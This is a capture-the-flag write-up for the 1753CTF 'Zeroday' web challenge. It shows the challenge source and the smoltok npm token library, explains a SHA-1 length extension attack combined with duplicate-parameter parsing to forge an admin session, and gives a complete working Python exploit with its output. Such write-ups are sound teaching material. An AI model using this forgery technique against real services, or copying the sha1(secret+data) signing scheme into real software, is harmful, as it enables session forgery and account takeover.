# 🪲 Zeroday (Score: 380 / Solves: 12)

## Description

> Found too many zerodays to keep count of them? Zeroday is your new bugtracker.
> Beta version access available only for our partners. Stay tuned for open access.
>
> <https://zeroday-3e5a363a1e8f.1753ctf.com/>
>
> <https://dl.1753ctf.com/zeroday/src/app.js?s=PPvbYztO>

## Source Code

<details><summary>zeroday_src_app.js</summary>

```js
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const initSQL = require('sql.js');
const smoltok = require('smoltok');
const crypto = require('crypto');

const app = express();
app.set('view engine', 'ejs');

const port = 1337;

const secret = crypto.randomBytes(64).toString("hex");

let db;

initSQL().then(async sql => {
    db = new sql.Database();

    db.exec("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)");
    db.exec("CREATE TABLE bugs (id INTEGER PRIMARY KEY, user_id INTEGER, title TEXT NOT NULL, FOREIGN KEY(user_id) REFERENCES users(id))");
    db.exec("INSERT INTO users (id, username, password) VALUES (1, 'adam', 'pwd')");
    db.exec("INSERT INTO users (id, username, password) VALUES (2, 'admin', '" + crypto.randomBytes(40).toString("hex") + "')")
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (1, 1, 'Donut dispenser is getting stuck twice a day')");
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (2, 1, 'Coffee machine brews tea')")
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (3, 2, '" + (process.env.flag || "1753c{fake_flag}") + "')")
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static("public"));

app.get('/login', (req, res) => {
    res.render("login");
})

app.post('/login', (req, res) => {
    const stmt = db.prepare("SELECT * FROM users WHERE username=:username AND password=:password");
    stmt.bind({ ':username': req.body["username"], ':password': req.body["password"] });

    if (!stmt.step()) {
        res.render("login", { error: "Incorrect login" });
    }
    else {
        const token = smoltok.encode({ "username": req.body["username"] }, secret);
        res.cookie("token", token);
        res.redirect("/");
    }

    stmt.free();
})

app.use((req, res, next) => {
    try {
        const token = req.cookies.token;
        req.user = smoltok.decode(token, secret);
        next();
    }
    catch (err) {
        res.redirect("/login")
    }

})

app.get('/', (req, res) => {
    const results = db.exec("SELECT b.title FROM bugs b JOIN users u ON b.user_id = u.id WHERE u.username like '" + req.user.username + "'")
    res.render("bugs", { results: results && results.length > 0 ? results[0].values : [], user: req.user })
})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
})
```

</details>

## Flag

1753c{well_youve_just_found_a_zero_day_on_npm}

## Summary

- Length extension attack
- Become admin using a technique similar to HTTP Parameter Pollution with `URLSearchParams` and `Object.fromEntries` (No SQLi)

## Initial Analysis

```js
// zeroday_src_app.js
initSQL().then(async sql => {
    db = new sql.Database();

    db.exec("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)");
    db.exec("CREATE TABLE bugs (id INTEGER PRIMARY KEY, user_id INTEGER, title TEXT NOT NULL, FOREIGN KEY(user_id) REFERENCES users(id))");
    db.exec("INSERT INTO users (id, username, password) VALUES (1, 'adam', 'pwd')");
    db.exec("INSERT INTO users (id, username, password) VALUES (2, 'admin', '" + crypto.randomBytes(40).toString("hex") + "')")
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (1, 1, 'Donut dispenser is getting stuck twice a day')");
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (2, 1, 'Coffee machine brews tea')")
    db.exec("INSERT INTO bugs (id, user_id, title) VALUES (3, 2, '" + (process.env.flag || "1753c{fake_flag}") + "')")
});
```

The flag is in the bugs table.

```js
// zeroday_src_app.js
app.use((req, res, next) => {
    try {
        const token = req.cookies.token;
        req.user = smoltok.decode(token, secret);
        next();
    }
    catch (err) {
        res.redirect("/login")
    }

})
```

The user is identified by a token stored in the cookie.

```js
// zeroday_src_app.js
app.get('/', (req, res) => {
    const results = db.exec("SELECT b.title FROM bugs b JOIN users u ON b.user_id = u.id WHERE u.username like '" + req.user.username + "'")
    res.render("bugs", { results: results && results.length > 0 ? results[0].values : [], user: req.user })
})
```

To get the flag, we need to create a token as an admin, save it to the cookie, and then access `/`.

```js
// zeroday_src_app.js
app.post('/login', (req, res) => {
    const stmt = db.prepare("SELECT * FROM users WHERE username=:username AND password=:password");
    stmt.bind({ ':username': req.body["username"], ':password': req.body["password"] });

    if (!stmt.step()) {
        res.render("login", { error: "Incorrect login" });
    }
    else {
        const token = smoltok.encode({ "username": req.body["username"] }, secret);
        res.cookie("token", token);
        res.redirect("/");
    }

    stmt.free();
})
```

The token is created using the NPM package called smoltok.

- [smoltok - npm](https://www.npmjs.com/package/smoltok?activeTab=code)

```js
// smoltok/index.js
const crypto = require("crypto");

const padBase64 = (base64String) => {
    const padLength = (4 - (base64String.length % 4)) % 4;
    return base64String + '='.repeat(padLength);
};

module.exports = {
    "encode": function (input, secret) {
        const data = new URLSearchParams(input).toString();
        const signature = crypto.createHash("sha1").update(Buffer.concat([Buffer.from(secret), Buffer.from(data)])).digest("base64");
        return Buffer.from(data).toString('base64').split('=').join('') + "." + signature.split('=').join('');
    },
    "decode": function (token, secret) {
        let [b64data, tokenSignature] = token.split(".").map(padBase64);
        const data = Buffer.from(b64data, 'base64');
        const signature = crypto.createHash("sha1").update(Buffer.concat([Buffer.from(secret), data])).digest("base64");
        if (tokenSignature != signature)
            throw new Error("Invalid signature");
        const entries = new URLSearchParams(data.toString('utf-8').replace(/[^ -~]/g, ''));
        return Object.fromEntries(entries)
    }
}
```

The token consists of `b64(data).rstrip("=") + . + signature.rstrip("=")`.
The signature is generated as `b64(sha1(secret+data))`.

```js
// zeroday_src_app.js
const secret = crypto.randomBytes(64).toString("hex");
```

Node.js Console:

```js
> crypto.randomBytes(64).toString("hex").length;
128
```

The length of secret is 128.

Also, regarding `smoltok.decode()`, when there are two same parameters in `URLSearchParams`, `Object.fromEntries` returns the latter parameter.

```js
> entries = new URLSearchParams("username=adamaaaaa&username=admin".toString('utf-8').replace(/[^ -~]/g, ''));
URLSearchParams { 'username' => 'adamaaaaa', 'username' => 'admin' }
> Object.fromEntries(entries)
{ username: 'admin' }
```

Thus, if we can generate the signature for the data `username=adam...&username=admin` using a length extension attack, we can get the flag.

## Solution

Requirements:

- [iagox86/hash_extender](https://github.com/iagox86/hash_extender) should be installed in `~/tools/hash_extender/hash_extender`

exploit.py

```python
import re
import requests
from base64 import b64decode, b64encode
import subprocess
from urllib.parse import unquote

requests.packages.urllib3.disable_warnings()

s = requests.Session()
s.verify = False
# s.proxies = {"https": "http://127.0.0.1:8080"}

base_url = "https://zeroday-3e5a363a1e8f.1753ctf.com"


def padBase64(base64String):
    padLength = (4 - (len(base64String) % 4)) % 4
    return base64String + "=" * padLength


def length_extension_attack(token):
    data, signature = map(lambda x: b64decode(padBase64(unquote(x))), token.split("."))

    result = subprocess.run(
        f"~/tools/hash_extender/hash_extender --signature {signature.hex()} -l 128 --data {data.decode()} --append '&username=admin' --format sha1 --table",
        shell=True,
        capture_output=True,
        check=True,
    )

    signature, data = map(
        lambda x: b64encode(bytes.fromhex(x)).decode().rstrip("="),
        result.stdout.decode().split()[1:],
    )

    return f"{data}.{signature}"


def main():
    s.post(
        f"{base_url}/login",
        data={"username": "adam", "password": "pwd"},
        allow_redirects=False,
    )

    new_token = length_extension_attack(s.cookies.get("token"))

    s.cookies.clear()
    s.cookies["token"] = new_token

    resp = s.get(base_url)

    if m := re.findall(r"1753c{.*}", resp.text):
        print(m[0])


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 exploit.py
1753c{well_youve_just_found_a_zero_day_on_npm}
```
